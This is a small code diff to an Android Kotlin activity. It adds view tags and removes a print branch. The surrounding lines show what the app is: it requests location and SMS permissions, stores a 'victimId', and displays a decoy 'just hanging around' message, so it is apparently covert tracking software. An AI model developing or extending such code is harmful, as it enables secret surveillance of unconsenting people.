@@ -39,7 +39,7 @@ class RegisterActivity : Activity() {
             val text : String = """
                 Permission needed to get current location and read SMS
             """.trimIndent()
-            this.createCenteredText(text)
+            this.createCenteredText(text, "permission_revoked")
         } else {
             this.userPreferences = UserPreferences()
             this.victimId = this.userPreferences.getValue("victimId", this).toString()
@@ -75,9 +75,6 @@ class RegisterActivity : Activity() {
                     val intent = Intent(this, RegisterActivity::class.java)
                     startActivity(intent)
                     finish()
-                    return
-                } else {
-                    print("Permission not granted")
                     return
                 }
             }
@@ -132,10 +129,10 @@ class RegisterActivity : Activity() {
         val text = """
             Me... Nothing, just hanging around...
         """.trimIndent()
-        this.createCenteredText(text)
+        this.createCenteredText(text, "tracker")
     }
 
-    private fun createCenteredText(text: String) {
+    private fun createCenteredText(text: String, textTag: String) {
         val linearLayout = LinearLayout(this).apply {
             orientation = VERTICAL
             layoutParams = ViewGroup.LayoutParams(
@@ -155,6 +152,7 @@ class RegisterActivity : Activity() {
                 setMargins(16, 16, 16, 16)
             }
             gravity = CENTER_HORIZONTAL
+            tag = textTag
         }
 
         textView.text = text
